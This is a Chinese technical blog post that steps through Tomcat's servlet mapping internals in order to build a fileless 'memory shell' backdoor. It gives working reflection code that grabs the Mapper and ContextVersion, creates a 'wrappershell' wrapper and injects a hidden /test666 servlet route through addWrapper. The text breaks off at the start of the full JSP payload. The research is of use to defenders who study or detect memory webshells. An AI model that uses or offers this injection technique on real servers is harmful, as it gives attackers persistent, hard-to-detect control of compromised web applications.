<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231160006153.png" alt="image-20201231160006153"></p>
<h4 id="tomcat-加载servlet分析"><a href="#tomcat-加载servlet分析" class="headerlink" title="tomcat 加载servlet分析"></a>tomcat 加载servlet分析</h4><p>​        接下来我们就要分析为什么servlet添加成功后还是无法访问,执行servlet的service请求，一定会经过org.apache.catalina.core.ApplicationFilterChain#internalDoFilter的servlet.service()方法,因此可以在这里打断点分析问题，访问自定义的servlet的url，这里对应的servlet类型并不是定义的TomcatServlet，需要向上追钟servlet是在哪里定义的。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231160647998.png" alt="image-20201231160647998"></p>
<p>​        在ApplicationFilterChain中仅有org.apache.catalina.core.ApplicationFilterChain#setServlet会为servlet赋值，因此可以在setServlet下断点查看。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231161437760.png" alt="image-20201231161437760"></p>
<p>​        继续向上跟踪调用 org.apache.catalina.core.ApplicationFilterFactory#createFilterChain中传入了servlet。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231161805758.png" alt="image-20201231161805758"></p>
<p>​        向上跟踪调用org.apache.catalina.core.StandardWrapperValve#invoke,invoke方法中，将wrapper.allocate()的结果赋值给servlet。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231162057960.png" alt="image-20201231162057960"></p>
<p>​        跟入wrapper.allocate()，这里instance已经是DefaultServlet了，因此不会再去创建实例。所以需要继续向上追踪，查看哪里给wrapper.instance赋值的。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231163240379.png" alt="image-20201231163240379"></p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231163419357.png" alt="image-20201231163419357"></p>
<p>​        看看wrapper是怎么得到的，通过getContainer()获取当前对象ValveBase的container得到的。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231164001104.png" alt="image-20201231164001104"></p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231164027686.png" alt="image-20201231164027686"></p>
<p>​            查看上层org.apache.catalina.core.StandardContextValve#invoke调用,container的内容在wrapper中已经赋值好了。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231165925365.png" alt="image-20201231165925365"></p>
<p>​        而wrapper的内容是通过request获得的，因此要继续向上追踪request是如何获得的。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231170148864.png" alt="image-20201231170148864"></p>
<p>​        向上跟踪到org.apache.catalina.connector.CoyoteAdapter#service方法中，在service方法中，创建了request对象，经过postParseRequest方法处理后，给servletClass赋值。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231170927517.png" alt="image-20201231170927517"></p>
<p>​        在postParseRequest方法中，经过<code>connector.getService().getMapper().map(serverName, decodedURI,version, request.getMappingData());</code>处理后servletClass会被赋值。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231171846938.png" alt="image-20201231171846938"></p>
<p>​        跟进map方法并向下跟踪调用，在org.apache.catalina.mapper.Mapper#find(org.apache.catalina.mapper.Mapper.MapElement<T>[], org.apache.tomcat.util.buf.CharChunk, int, int)中会去比对访问的路径和定义的servlet路径是否相同。这里的map对象中只有我们定义的servlet的路径，并没有动态添加的servlet路径。</T></p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231172858261.png" alt="image-20201231172858261"></p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231172956381.png" alt="image-20201231172956381"></p>
<p>​        看到上面其实我们已经知道为什么我们动态添加的servlet没有加载了，再看看find方法的上层调用org.apache.catalina.mapper.Mapper#internalMapExactWrapper,由于没有匹配到结果，因此wrapper返回为空，不满足if条件会被直接返回。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231173956853.png" alt="image-20201231173956853"></p>
<p>​        也就是说<code>contextVersion.exactWrappers</code>匹配失败，<code>contextVersion.exactWrappers</code>中保存的是自定义的servlet的mapper。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231174828367.png" alt="image-20201231174828367"></p>
<p>​        exactWrappers匹配失败后会去判断<code>contextVersion.extensionWrappers</code>是否匹配。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231175039952.png" alt="image-20201231175039952"></p>
<p>​        其他的类似，最后处理default servlet设置<code>mappingData.wrapper</code>的值为defaultWrapper，因此访问/test666最终会执行defaultServlet。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20201231175138329.png" alt="image-20201231175138329"></p>
<h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><p>​        通过上面的分析，我们只要在contextVersion中添加Mapper即可动态加载内存马。首先看一下<code>contextVersion.exactWrappers</code>是在何时赋值的，经过分析调用，在org.apache.catalina.mapper.Mapper#addWrapper(org.apache.catalina.mapper.Mapper.ContextVersion, java.lang.String, org.apache.catalina.Wrapper, boolean, boolean)中，会根据url的内容不同，给mapper的不同wrappers属性赋值，当所有的都不匹配是，才会给exactWrappers赋值。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">addWrapper</span><span class="params">(ContextVersion context, String path,</span></span></span><br><span class="line"><span class="function"><span class="params">           Wrapper wrapper, <span class="keyword">boolean</span> jspWildCard, <span class="keyword">boolean</span> resourceOnly)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">synchronized</span> (context) &#123;</span><br><span class="line">           <span class="keyword">if</span> (path.endsWith(<span class="string">"/*"</span>)) &#123;</span><br><span class="line">               <span class="comment">// Wildcard wrapper</span></span><br><span class="line">               String name = path.substring(<span class="number">0</span>, path.length() - <span class="number">2</span>);</span><br><span class="line">               MappedWrapper newWrapper = <span class="keyword">new</span> MappedWrapper(name, wrapper,</span><br><span class="line">                       jspWildCard, resourceOnly);</span><br><span class="line">               MappedWrapper[] oldWrappers = context.wildcardWrappers;</span><br><span class="line">               MappedWrapper[] newWrappers = <span class="keyword">new</span> MappedWrapper[oldWrappers.length + <span class="number">1</span>];</span><br><span class="line">               <span class="keyword">if</span> (insertMap(oldWrappers, newWrappers, newWrapper)) &#123;</span><br><span class="line">                   context.wildcardWrappers = newWrappers;</span><br><span class="line">                   <span class="keyword">int</span> slashCount = slashCount(newWrapper.name);</span><br><span class="line">                   <span class="keyword">if</span> (slashCount &gt; context.nesting) &#123;</span><br><span class="line">                       context.nesting = slashCount;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (path.startsWith(<span class="string">"*."</span>)) &#123;</span><br><span class="line">               <span class="comment">// Extension wrapper</span></span><br><span class="line">               String name = path.substring(<span class="number">2</span>);</span><br><span class="line">               MappedWrapper newWrapper = <span class="keyword">new</span> MappedWrapper(name, wrapper,</span><br><span class="line">                       jspWildCard, resourceOnly);</span><br><span class="line">               MappedWrapper[] oldWrappers = context.extensionWrappers;</span><br><span class="line">               MappedWrapper[] newWrappers =</span><br><span class="line">                   <span class="keyword">new</span> MappedWrapper[oldWrappers.length + <span class="number">1</span>];</span><br><span class="line">               <span class="keyword">if</span> (insertMap(oldWrappers, newWrappers, newWrapper)) &#123;</span><br><span class="line">                   context.extensionWrappers = newWrappers; <span class="comment">//extensionWrappers赋值</span></span><br><span class="line">               &#125;</span><br><span class="line">           &#125; <span class="keyword">else</span> <span class="keyword">if</span> (path.equals(<span class="string">"/"</span>)) &#123;</span><br><span class="line">               <span class="comment">// Default wrapper</span></span><br><span class="line">               MappedWrapper newWrapper = <span class="keyword">new</span> MappedWrapper(<span class="string">""</span>, wrapper,</span><br><span class="line">                       jspWildCard, resourceOnly);</span><br><span class="line">               context.defaultWrapper = newWrapper; <span class="comment">//defaultWrapper赋值</span></span><br><span class="line">           &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">               <span class="comment">// Exact wrapper</span></span><br><span class="line">               <span class="keyword">final</span> String name;</span><br><span class="line">               <span class="keyword">if</span> (path.length() == <span class="number">0</span>) &#123;</span><br><span class="line">                   <span class="comment">// Special case for the Context Root mapping which is</span></span><br><span class="line">                   <span class="comment">// treated as an exact match</span></span><br><span class="line">                   name = <span class="string">"/"</span>;</span><br><span class="line">               &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                   name = path;</span><br><span class="line">               &#125;</span><br><span class="line">               MappedWrapper newWrapper = <span class="keyword">new</span> MappedWrapper(name, wrapper,</span><br><span class="line">                       jspWildCard, resourceOnly);</span><br><span class="line">               MappedWrapper[] oldWrappers = context.exactWrappers;</span><br><span class="line">               MappedWrapper[] newWrappers = <span class="keyword">new</span> MappedWrapper[oldWrappers.length + <span class="number">1</span>];</span><br><span class="line">               <span class="keyword">if</span> (insertMap(oldWrappers, newWrappers, newWrapper)) &#123;</span><br><span class="line">                   context.exactWrappers = newWrappers;  <span class="comment">//exactWrappers赋值</span></span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104110344314.png" alt="image-20210104110344314"></p>
<p>​        我们要调用addWrapper来设置wrapper的属性，首先得解决几个问题：</p>
<h4 id="问题一：如何获取-ContextVersion对象？"><a href="#问题一：如何获取-ContextVersion对象？" class="headerlink" title="问题一：如何获取 ContextVersion对象？"></a><strong>问题一：如何获取 ContextVersion对象？</strong></h4><p>​        查看addWrapper的调用链，addWrapper是由org.apache.catalina.mapper.Mapper#addWrappers(org.apache.catalina.mapper.Mapper.ContextVersion, java.util.Collection&lt;org.apache.catalina.mapper.WrapperMappingInfo&gt;)调用的，而addWrappers中已经传入了ContextVersion对象，所以需要继续向上追踪。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104112628640.png" alt="image-20210104112628640"></p>
<p>​        在org.apache.catalina.mapper.Mapper#addContextVersion中，创建了ContextVersion对象，但是创建直接创建这个对象需要resources这个属性，而这个属性是StandardRoot对象，在运行过程中无法通过standardContext来获取，所以不考虑通过new的方式创建ContextVersion对象，但是经过分析ContextVersion对象会被保存到mapper的contextObjectToContextVersionMap，因此可以通过获取mapper-》contextObjectToContextVersionMap-》ContextVersion来获取ContextVersion对象。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104144102396.png" alt="image-20210104144102396"></p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104144140687.png" alt="image-20210104144140687"></p>
<p>​        可以将获取ContextVersion是的问题转换为获取Mapper对象的问题。继续向上跟踪org.apache.catalina.mapper.MapperListener#registerContext中，通过mapper对象来调用的addContextVersion。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104113652212.png" alt="image-20210104113652212"></p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104113753731.png" alt="image-20210104113753731"></p>
<p>​        经过调试发现，mapper对象可以通过StandardService来获取，而applicationContext中可以获取service对象，因此获取ContextVersion的问题可以解决。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104113819306.png" alt="image-20210104113819306"></p>
<h4 id="问题二：如何创建一个Wrapper对象？"><a href="#问题二：如何创建一个Wrapper对象？" class="headerlink" title="问题二：如何创建一个Wrapper对象？"></a>问题二：如何创建一个Wrapper对象？</h4><p>​        在addWrapper中的wrapper是一个StandardWrapper对象，所以要分析如何获取StandardWrapper对象。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104115103558.png" alt="image-20210104115103558"></p>
<p>​        在StandardWrapper的构造方法打断点，可以看到在org.apache.catalina.core.StandardContext#createWrapper中，可以获取StandardWrapper对象。StandardContext是可以动态获取的，因此可以通过StandardContext.createWrapper方法获取到StandardWrapper对象。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104115418557.png" alt="image-20210104115418557"></p>
<p>​        但查看addWrapper方法中的wrapper对象，其使用的还是非常多的。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104120216543.png" alt="image-20210104120216543"></p>
<p>​        但是这点不用担心，因为通过<code>new StandardWrapper()</code>创建wrapper就会设置很多属性，只要对instance、servletclass、mappings等和servlet有关的属性设置就可以了。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104134133813.png" alt="image-20210104134133813"></p>
<h2 id="servlet内存马实现"><a href="#servlet内存马实现" class="headerlink" title="servlet内存马实现"></a>servlet内存马实现</h2><p>​        在本部分的内容不讲如何获取standardContext、applicationContext等对象了，之前在Filter内存马的时候分析过了。假设已经获取了standardContext、applicationContext对象，下面获取其他对象。</p>
<h3 id="获取ContextVersion"><a href="#获取ContextVersion" class="headerlink" title="获取ContextVersion"></a>获取ContextVersion</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Field serviceF = applicationContext.getClass().getDeclaredField(<span class="string">"service"</span>); <span class="comment">//通过applicationContext获取service对象</span></span><br><span class="line">serviceF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">StandardService service = (StandardService) serviceF.get(applicationContext);</span><br><span class="line">Mapper mapper = service.getMapper(); <span class="comment">//获取mapper</span></span><br><span class="line">Field contextObjectToContextVersionMapF = mapper.getClass().getDeclaredField(<span class="string">"contextObjectToContextVersionMap"</span>); </span><br><span class="line">contextObjectToContextVersionMapF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ConcurrentHashMap contextObjectToContextVersionMap = (ConcurrentHashMap ) contextObjectToContextVersionMapF.get(mapper); <span class="comment">//获取contextObjectToContextVersionMap属性</span></span><br><span class="line">Object contextVersion = contextObjectToContextVersionMap.get(standardContext); <span class="comment">//获取contextVersion对象</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104144759287.png" alt="image-20210104144759287"></p>
<h3 id="创建Wrapper对象并赋值"><a href="#创建Wrapper对象并赋值" class="headerlink" title="创建Wrapper对象并赋值"></a>创建Wrapper对象并赋值</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">StandardWrapper wrappershell = (StandardWrapper) standardContext.createWrapper(); <span class="comment">//获取StandardWrapper对象</span></span><br><span class="line">TomcatServlet tomcatServlet=<span class="keyword">new</span> TomcatServlet(); <span class="comment">//创建servlet对象</span></span><br><span class="line">Field instanceF = wrappershell.getClass().getDeclaredField(<span class="string">"instance"</span>); <span class="comment">//获取StandardWrapper打的instance属性</span></span><br><span class="line">instanceF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">instanceF.set(wrappershell,tomcatServlet); <span class="comment">//为instance属性赋值</span></span><br><span class="line">wrappershell.setServletClass(Class.forName(<span class="string">"TomcatServlet"</span>).getName()); <span class="comment">//设置servletclass属性，可以通过setServletClass实现，因此不需要通过反射机制修改。</span></span><br></pre></td></tr></table></figure>

<p>​        通过上面的设置，可以得到StandardWrapper对象，并且设置其中的instance和servletClass属性，下面尝试通过<code>wrappershell.addMapping(&quot;/test666&quot;);</code>但是这么设置后由于没有给StandardWrapper设置parent属性所以会抛异常。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104141540768.png" alt="image-20210104141540768"></p>
<p>​        在addWrapper方法中，wrapper.parent是StandardContext对象，因此需要设置StandardWrapper.parent为StandardContext。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104141837343.png" alt="image-20210104141837343"></p>
<p>​        parent属性的定义在org.apache.catalina.core.ContainerBase中</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104142155491.png" alt="image-20210104142155491"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Field parent = ContainerBase.class.getDeclaredField("parent");</span><br><span class="line">parent.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">parent.set(wrappershell, standardContext);</span><br><span class="line">wrappershell.addMapping(<span class="string">"/test666"</span>);</span><br></pre></td></tr></table></figure>

<h3 id="addWrapper设置exactWrappers"><a href="#addWrapper设置exactWrappers" class="headerlink" title="addWrapper设置exactWrappers"></a>addWrapper设置exactWrappers</h3><p>​        下面通过反射调用addWrapper</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Class[] classes = mapper.getClass().getDeclaredClasses();</span><br><span class="line">Class contextversionClass = classes[<span class="number">1</span>]; <span class="comment">//获取内部类contextversion的Class</span></span><br><span class="line">Method addWrapper = mapper.getClass().getDeclaredMethod(<span class="string">"addWrapper"</span>, contextversionClass, String<span class="class">.<span class="keyword">class</span>, <span class="title">Wrapper</span>.<span class="title">class</span>, <span class="title">boolean</span>.<span class="title">class</span>, <span class="title">boolean</span>.<span class="title">class</span>)</span>;</span><br><span class="line">addWrapper.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">addWrapper.invoke(mapper, contextVersion, <span class="string">"/test666"</span>, wrappershell, <span class="keyword">false</span>, <span class="keyword">false</span>); <span class="comment">//反射调用addWrapper</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104150812155.png" alt="image-20210104150812155"></p>
<p>​        最终成功实现内存马的功能。</p>
<p><img src="/2020/12/31/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90-servlet%E5%86%85%E5%AD%98%E9%A9%AC/image-20210104150927298.png" alt="image-20210104150927298"></p>
<p>​        给出完整的JSP代码，如下所示：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">"text/html;charset=UTF-8"</span> language=<span class="string">"java"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">"javax.management.MBeanServer"</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span 